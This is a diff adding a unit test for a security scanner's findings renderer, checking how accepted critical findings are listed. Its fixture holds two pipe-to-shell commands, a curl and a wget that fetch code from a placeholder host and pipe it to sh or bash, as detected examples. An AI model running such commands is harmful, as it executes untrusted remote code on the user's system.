@@ -71,3 +71,28 @@ test("renderFindings marks a low-confidence finding and no other", () => {
     ].join("\n"),
   );
 });
+
+test("renderFindings keeps an accepted critical finding under critical and marks it accepted", () => {
+  const curl = {
+    severity: "critical",
+    confidence: "high",
+    rule: "curl-pipe-shell",
+    help: "runs downloaded code",
+    file: "setup.sh",
+  } as const;
+  const findings: Finding[] = [
+    { ...curl, line: 2, detail: "curl https://x.invalid | sh", accepted: true },
+    { ...curl, line: 5, detail: "wget -qO- https://x.invalid | bash" },
+  ];
+
+  expect(Bun.stripANSI(renderFindings("fixture", findings))).toBe(
+    [
+      "fixture: security scan",
+      "",
+      "2 critical findings",
+      "  curl-pipe-shell: runs downloaded code",
+      "    setup.sh:2  curl https://x.invalid | sh (accepted)",
+      "    setup.sh:5  wget -qO- https://x.invalid | bash",
+    ].join("\n"),
+  );
+});
